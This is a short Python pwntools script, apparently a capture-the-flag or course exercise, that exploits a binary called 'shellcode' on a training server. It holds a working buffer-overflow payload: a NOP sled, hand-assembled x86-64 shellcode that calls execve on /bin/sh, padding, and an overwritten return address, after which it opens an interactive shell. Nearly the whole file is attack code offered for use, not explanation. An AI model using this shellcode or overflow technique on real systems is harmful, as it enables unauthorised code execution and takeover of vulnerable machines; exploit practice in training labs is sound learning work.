
from pwn import *
site = "training.jinblack.it"
port = 2001
#r = remote (site, port )#write a version that connects on a specified port on argument

context.terminal =['tmux','splitw','-h']
#site = "training.jinblack.it"
#port = 3001

#r = process("./shellcode")
r = gdb.debug("./shellcode",'''b *0x400696
                               continue ''')
#0x601080

test_two =b"\x90"*16+b"\x48\xC7\xC4\x80\x10\x60\x00\x48\x81\xC4\x00\x01\x00\x00\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"+b"\x90"*945+b"\x40\x10\x60\x00\x00\x00\x00\x00"+b"\x90"*0+b"\x40\x10\x60\x00\x00\x00\x00\x00"
input("press any key")
r.send(test_two)
r.interactive()
#from this point on the connection opens a shell for stdin/stdout
